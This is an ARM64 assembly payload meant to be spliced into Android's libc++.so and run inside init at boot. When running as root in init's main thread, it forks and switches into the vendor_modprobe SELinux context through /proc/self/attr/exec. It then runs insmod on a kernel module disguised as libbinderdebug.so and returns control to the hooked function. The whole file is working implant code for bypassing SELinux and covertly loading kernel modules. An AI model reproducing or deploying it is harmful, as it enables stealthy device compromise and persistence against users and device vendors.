    .arch armv8-a

    .include "include.inc"

    .global libcxx_start
    .global libcxx_data
    .global libcxx_len
    .global libcxx_first_inst_copy
    .data


libcxx_data:

mutex_file:
    .asciz "/dev/df"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
selinux_ctx_end:
attr_exec:
    .asciz "/proc/self/attr/exec"
exe_path:
    .asciz "/vendor/bin/insmod"
ko_target:
    .ascii "/vendor/lib64/libbinderdebug.so\0"
    .skip 32, 0                             /* pad to 64 bytes — longest candidate path */
    .balign 4
    .global libcxx_ko_target_off
libcxx_ko_target_off:
    .int ko_target - libcxx_data

    .align 4

libcxx_start:
    /* Only what this payload actually writes is saved: x0-x4 (syscall arguments
     * and return value) and x8 (syscall number), plus the stack pointer. x5-x7,
     * x9-x29 and x30 are never touched, so the old stp-x0..x29 + x30 prologue was
     * 24 bytes of dead weight - and on a packed libc++.so every byte counts. */
    sub     sp, sp, #48
    stp     x0, x1, [sp, #0]
    stp     x2, x3, [sp, #16]
    str     x4, [sp, #32]
    str     x8, [sp, #40]

    // Detect root uid = 0
    mov     x8, SYS_getuid
    svc     0
    cbnz    w0, return

    // Detect init tid = 1
    // We need thread 1 to use the default namespace
    mov     x8, SYS_gettid
    svc     0
    cmp     w0, 1
    bne     return

    // To avoid later call of hook to execute payload, create file as mutex.
    // Mutex: openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL|O_CLOEXEC, 0)
    mov     x0, -100
    adr     x1, mutex_file
    movl    x2, (O_CREAT|O_EXCL|O_CLOEXEC)
    mov     x3, xzr
    mov     x8, #SYS_openat
    svc     0

    // return if fail to open (file exist)
    tbnz    w0, #31, return

    // clone(SIGCHLD, 0, NULL, NULL, NULL)
    // No ctid: the parent never reads the child tid, so the tidy-up flags and
    // the stack slot that used to carry it are gone.
    mov     x0, #SIGCHLD
    mov     x1, xzr
    mov     x2, xzr
    mov     x3, xzr
    mov     x4, xzr
    mov     x8, #SYS_clone
    svc     0

    cbnz    w0, return          // parent returns to init

    // ── worker child ──────────────────────────────────────────────────────
    // Fork once more: the grandchild is reparented away from the init thread, so
    // insmod is not a child init's own SIGCHLD handling has to make sense of.
    mov     x0, #SIGCHLD
    mov     x1, xzr
    mov     x2, xzr
    mov     x3, xzr
    mov     x4, xzr
    mov     x8, #SYS_clone
    svc     0
    cbnz    w0, myexit

    // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
    sub     sp, sp, 32          // argv block for execve

    // open /proc/self/attr/exec
    mov     x0, -100
    adr     x1, attr_exec
    movl    x2, (O_WRONLY|O_CLOEXEC)
    mov     x8, #SYS_openat
    svc     0
    adr     x1, selinux_ctx
    mov     x2, selinux_ctx_end - selinux_ctx
    mov     x8, #SYS_write
    svc     0

    // execve("/vendor/bin/insmod", [exe_path, ko_target, NULL], NULL)
    adr     x1, exe_path
    str     x1, [sp]
    adr     x1, ko_target
    str     x1, [sp, 8]
    str     xzr, [sp, 16]
    adr     x0, exe_path
    mov     x1, sp
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0

myexit:
    mov     x0, #1
    mov     x8, #SYS_exit
    svc     0

return:
    ldr     x8, [sp, #40]
    ldr     x4, [sp, #32]
    ldp     x2, x3, [sp, #16]
    ldp     x0, x1, [sp, #0]
    add     sp, sp, #48
libcxx_first_inst_copy:
    .space  4                   /* patched with the hook site's first instruction */
    b       end                 /* patched with the branch back to hook + 4 */
end:
    .balign 16                  /* libcxx_len stays a multiple of 16 = the pad size */
libcxx_end:
libcxx_len:
    .word libcxx_end - libcxx_data
